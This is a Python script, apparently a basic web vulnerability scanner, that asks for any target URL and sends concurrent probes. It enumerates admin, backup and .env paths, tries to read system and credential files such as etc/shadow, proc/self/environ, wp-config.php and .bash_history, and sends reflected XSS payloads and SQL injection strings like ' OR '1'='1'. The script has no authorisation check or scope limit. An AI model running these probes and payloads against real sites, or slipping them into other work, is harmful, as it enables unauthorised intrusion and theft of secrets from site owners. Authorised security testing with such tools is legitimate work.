import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlencode, urlparse
import sys

DEFAULT_TIMEOUT = 6
MAX_WORKERS = 30

def safe_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": "SimpleScanner/1.0 (+https://example.invalid)"
    })
    return s

def fetch_get(session, url, timeout=DEFAULT_TIMEOUT):
    try:
        r = session.get(url, timeout=timeout, allow_redirects=True)
        return (url, r.status_code, r.reason, r.text[:800])
    except requests.RequestException as e:
        return (url, None, str(e), None)

def run_concurrent_requests(urls, max_workers=MAX_WORKERS, timeout=DEFAULT_TIMEOUT):
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as ex, safe_session() as s:
        futures = {ex.submit(fetch_get, s, u, timeout): u for u in urls}
        for fut in as_completed(futures):
            try:
                result = fut.result()
            except Exception as e:
                result = (futures[fut], None, f"Exception: {e}", None)
            results.append(result)
    return results

def ensure_trailing_slash(u):
    return u if str(u).endswith('/') else u + '/'

def normalize_base(url):
    parsed = urlparse(url)
    if parsed.scheme and parsed.netloc:
        base = f"{parsed.scheme}://{parsed.netloc}/"
        return base
    if not url.startswith("http://") and not url.startswith("https://"):
        return "http://" + ensure_trailing_slash(url)
    return ensure_trailing_slash(url)

def check_paths(base_url, paths):
    base_url = ensure_trailing_slash(base_url)
    tests = [urljoin(base_url, p) for p in paths]
    print(f"[*] Checking {len(tests)} paths on {base_url}\033[0m")
    results = run_concurrent_requests(tests)
    for url, status, reason, snippet in results:
        if status == 200:
            print(f"\033[92m[!] 200 OK: {url}\033[0m")
        elif status is None:
            print(f"\033[91m[-] ERROR: {url} -> {reason}\033[0m")
        else:
            print(f"\033[91m[ ] {status} {reason}: {url}\033[0m")

def check_sensitive_files(base_url, files):
    base_url = ensure_trailing_slash(base_url)
    tests = [urljoin(base_url, f) for f in files]
    print(f"[*] Checking {len(tests)} sensitive file paths on {base_url}\033[0m")
    results = run_concurrent_requests(tests)
    for url, status, reason, snippet in results:
        if status == 200:
            print(f"\033[92m[!] Possible sensitive file accessible (200): {url}\033[0m")
        elif status is None:
            print(f"\033[91m[-] ERROR: {url} -> {reason}\033[0m")
        else:
            print(f"\033[91m[ ] {status} {reason}: {url}\033[0m")

def test_xss(base_url, payloads, indicators, param_name="q"):
    base_url = ensure_trailing_slash(base_url)
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    tests = []
    for p in payloads:
        qs = urlencode({param_name: p})
        tests.append(origin + "/?" + qs)
    print(f"[*] Testing {len(tests)} XSS payloads via query parameter '{param_name}'\033[0m")
    results = run_concurrent_requests(tests)
    for url, status, reason, snippet in results:
        if status is None:
            print(f"\033[91m[-] ERROR: {url} -> {reason}\033[0m")
            continue
        if any(ind in (snippet or "") for ind in indicators):
            print(f"\033[92m[!] XSS indicator found in response for: {url} (status: {status})\033[0m")
        else:
            print(f"\033[91m[ ] {status} {reason}: {url}\033[0m")

def test_sql_injection(base_url, payloads, indicators, param_name="id"):
    base_url = ensure_trailing_slash(base_url)
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    tests = []
    for p in payloads:
        qs = urlencode({param_name: p})
        tests.append(origin + "/?" + qs)
    print(f"[*] Testing {len(tests)} SQL-like payloads via query parameter '{param_name}'\033[0m")
    results = run_concurrent_requests(tests)
    for url, status, reason, snippet in results:
        if status is None:
            print(f"\033[91m[-] ERROR: {url} -> {reason}\033[0m")
            continue
        body = (snippet or "")
        if any(ind.lower() in body.lower() for ind in indicators):
            print(f"[!] SQL error indicator found for: {url} (status: {status})\033[0m")
        else:
            print(f"\033[91m[ ] {status} {reason}: {url}\033[0m")

def main():
    try:
        target = input("Enter the target URL (include http(s):// if possible): ").strip()
        if not target:
            print("No URL provided. Exiting.")
            return
        base = normalize_base(target)

        possible_paths = [
            "admin", "admin/", "admin/index.php", "admin/login.php", "admin/config.php",
            "backup", "backup/", "backup/db.sql", "backup/config.tar.gz", "backup/backup.sql",
            "private", "private/", "private/.env", "private/config.php", "private/secret.txt",
            "uploads", "uploads/", "uploads/file.txt", "uploads/image.jpg", "uploads/backup.zip",
            "api", "api/", "api/v1/", "api/v1/users", "api/v1/status",
            "logs", "logs/", "logs/error.log", "logs/access.log", "logs/debug.log",
            "cache", "cache/", "cache/temp/", "cache/session/", "cache/data/",
            "server-status", "server-status/", "server-status/index.html",
            "dashboard", "dashboard/", "dashboard/index.html", "dashboard/admin.php", "dashboard/settings.php"
        ]

        sensitive_files = [
            "etc/passwd", "etc/password", "etc/shadow", "etc/group", "etc/hosts", "etc/hostname",
            "var/log/auth.log", "var/log/syslog", "var/log/messages", "var/log/nginx/access.log",
            "root/.bash_history", "home/user/.bash_history", "www/html/wp-config.php", "proc/self/environ",
            "opt/lampp/phpmyadmin/config.inc.php", "boot/grub/menu.lst", "proc/net/tcp"
        ]

        xss_payloads = [
            "<script>alert('XssFoundByRedTiger')</script>",
            "<img src=x onerror=alert('XssFoundByRedTiger')>",
            "<svg/onload=alert('XssFoundByRedTiger')>"
        ]
        xss_indicators = ["<script>", "alert(", "onerror=", "<svg", "javascript:"]

        sql_payloads = [
            "'", '"', "''", "' OR '1'='1'", "' OR 1=1", "/1000",
            "' OR 'a'='a", "' OR ''='", "admin'", "' OR 'x'='x'", "' OR 1=1#"
        ]
        sql_indicators = [
            "SQL syntax", "SQL error", "MySQL", "mysql",
            "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-",
            "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
            "You have an error in your SQL syntax", "Incorrect syntax near",
            "SQL command not properly ended", "warning", "error"
        ]

        print("\n== PATH DISCOVERY ==")
        check_paths(base, possible_paths)

        print("\n== SENSITIVE FILES ==")
        check_sensitive_files(base, sensitive_files)

        print("\n== XSS TESTS (simple) ==")
        test_xss(base, xss_payloads, xss_indicators, param_name="q")

        print("\n== SQL-LIKE TESTS (basic indicators) ==")
        test_sql_injection(base, sql_payloads, sql_indicators, param_name="id")

        print("\nDone.")
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
    except Exception as e:
        print(f"Fatal error: {e}", file=sys.stderr)

if __name__ == "__main__":
    main()
